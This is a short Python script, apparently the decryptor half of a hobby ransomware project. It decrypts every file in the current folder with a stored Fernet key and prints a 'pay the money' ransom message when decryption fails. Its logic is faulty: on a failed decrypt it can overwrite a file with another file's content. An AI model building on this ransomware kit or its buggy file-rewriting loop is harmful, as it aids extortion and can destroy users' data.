import os
from cryptography.fernet import Fernet

files = []
flag = 0

for file in os.listdir():
    
    if file =='ransomeware.py' or file == 'seckey.key' or file == 'decrypt.py':
        pass
    else:
        os.path.isfile(file)
        files.append(file)
    #   print(files)
       
with open("seckey.key", "rb") as k :
    secretkey = k.read().strip()
    
# secret_phrase = "Kunj"

# user_entry = input("Enter the secret code to decrypt your files:")

# if user_entry == secret_phrase:
    #Logic to decrypt all the files


for file in files :
    try:
        with open(file, 'rb') as theFile :
            size = os.path.getsize(file)
            content = theFile.read(size)
            decrpyted_content = Fernet(secretkey).decrypt(content)

    except:
        print("Error !")
    with open(file, 'wb') as theFile :
        theFile.write(decrpyted_content)
        flag = 1

if(flag==1):
    print("Decryption complete")
else :
    print("Wrong passcode, pay the money to get the right passcode")
